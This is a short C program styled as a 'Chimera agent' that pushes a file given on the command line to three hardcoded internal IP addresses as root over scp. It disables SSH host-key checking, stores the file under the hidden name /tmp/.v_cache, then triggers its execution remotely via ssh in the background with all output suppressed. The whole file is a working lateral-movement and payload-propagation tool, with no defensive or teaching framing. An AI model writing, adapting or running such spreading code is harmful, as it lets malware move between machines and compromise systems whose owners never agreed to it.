#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    char *source_path = argv[1];
    char *targets[] = {"172.25.0.10", "172.25.0.11", "172.25.0.12"};
    char cmd[512];

    printf("\n--- CHIMERA AGENT 314-V4.1: ABSOLUTE LEAP ---\n");

    for (int i = 0; i < 3; i++) {
        printf("[*] Leap Initiated -> %s\n", targets[i]);

        // SCP with StrictHostKeyChecking disabled
        snprintf(cmd, sizeof(cmd), 
            "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s root@%s:/tmp/.v_cache > /dev/null 2>&1", 
            source_path, targets[i]);
        
        if (system(cmd) == 0) {
            printf("    [+] Delivered to %s\n", targets[i]);
            
            // SSH Trigger with StrictHostKeyChecking disabled
            snprintf(cmd, sizeof(cmd), 
                "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@%s 'chmod +x /tmp/.v_cache && /tmp/.v_cache' > /dev/null 2>&1 &", 
                targets[i]);
            
            system(cmd);
            printf("    [+] Triggered on %s\n", targets[i]);
        } else {
            printf("    [-] Delivery Failed to %s (Check SSH/Network)\n", targets[i]);
        }
    }
    return 0;
}
